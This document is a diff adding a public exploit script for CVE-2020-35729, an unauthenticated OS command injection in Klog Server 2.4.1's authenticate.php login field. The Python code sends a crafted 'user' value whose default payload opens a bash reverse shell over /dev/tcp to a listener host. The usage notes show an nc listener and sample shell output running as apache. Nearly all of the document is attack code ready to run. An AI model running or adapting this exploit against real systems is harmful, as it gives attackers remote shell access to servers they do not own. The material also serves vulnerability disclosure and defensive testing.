@@ -1,0 +1,97 @@
+# Exploit Title: Klog Server 2.4.1 - Command Injection (Unauthenticated)
+# Date: 22.12.2020
+# Exploit Author: b3kc4t (Mustafa GUNDOGDU)
+# Vendor Homepage: https://www.klogserver.com/
+# Version: 2.4.1
+# Tested On: Ubuntu 18.04
+# CVE: 2020-35729
+# Description: https://github.com/mustgundogdu/Research/tree/main/KLOG_SERVER
+
+"""
+         ~ VULNERABILITY DETAILS ~
+    
+    #
+    The Klog Server runs the injected os commands on the server , causing os command
+    injection vulnerability.    
+    
+    #
+    The following python code will inject os command payload and can be relaized reverse
+    shell connection.And you can be added payload except the default payload plugin.
+
+    ##USAGE##
+
+    $sudo nc -nlvp 98
+    $sudo python klog_exploit.py --exploit --url https://10.10.56.51:443/actions/authenticate.php --payload "test\"$bash -i >& /dev/tcp/10.10.56.52/98 0>&1&\""
+
+    ##OUTPUT##
+
+    bash-4.2$whoami
+    apache
+    bash-4.2$
+
+"""
+
+import requests
+import argparse
+from colorama import Fore, Back, Style, init
+
+
+def main():
+    
+    desc = "KLOG SERVER 2.4.1 EXPLOIT"
+    parser = argparse.ArgumentParser(description=desc)
+    option = parser.add_argument_group('[*]OPTIONS[*]')
+    parser.add_argument("--url", help=Fore.GREEN+"[*]TARGET URL ADDRESS[*]", required=False)
+    parser.add_argument("--payload",help=Fore.GREEN+"[*] TO ADD PAYLOAD  [*]", type=str,required=False)
+    parser.add_argument("--exploit", help=Fore.GREEN+" ", action="store_true")
+    args = parser.parse_args()
+    
+    if args.exploit:
+
+        if args.url:
+            url = args.url
+            
+            if args.payload:
+                payload = args.payload
+                target_send_config(url, payload)
+            
+            #default bash reverse shell payload
+            else:
+                payload = "test\"&bash -i >& /dev/tcp/10.10.56.52/88 0>&1&\""
+                target_send_config(url, payload)
+
+        else:
+            #default url (klog server init ip address)
+            url = "https://10.10.56.51:443/actions/authenticate.php"
+            
+            if args.payload:
+                payload = args.payload
+                target_send_config(url, payload)
+            else: 
+                payload = "test\"&bash -i >& /dev/tcp/10.10.56.52/88 0>&1&\""
+                target_send_config(url, payload)
+
+
+def target_send_config(url, payload):
+        
+    headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0", 
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
+                "Accept-Language": "en-US,en;q=0.5", 
+                "Accept-Encoding": "gzip, deflate", 
+                "Content-Type": "application/x-www-form-urlencoded", 
+                "Connection": "close", 
+                "Upgrade-Insecure-Requests": "1"}
+    #injection place
+    data = {"user": payload, 
+            "pswd": "test"}
+    
+    try:
+    #post method send    
+        requests.post(url, headers=headers, data=data, verify=False)
+        print(" ")
+        print(Fore.GREEN+" "+"[+] EXPLOIT SUCCESSFUL PAYLOAD IS SENT [+]")
+    except:
+        print(Fore.RED+"[-] EXPLOIT FAILED [-]")
+
+if __name__ == '__main__':
+    main()
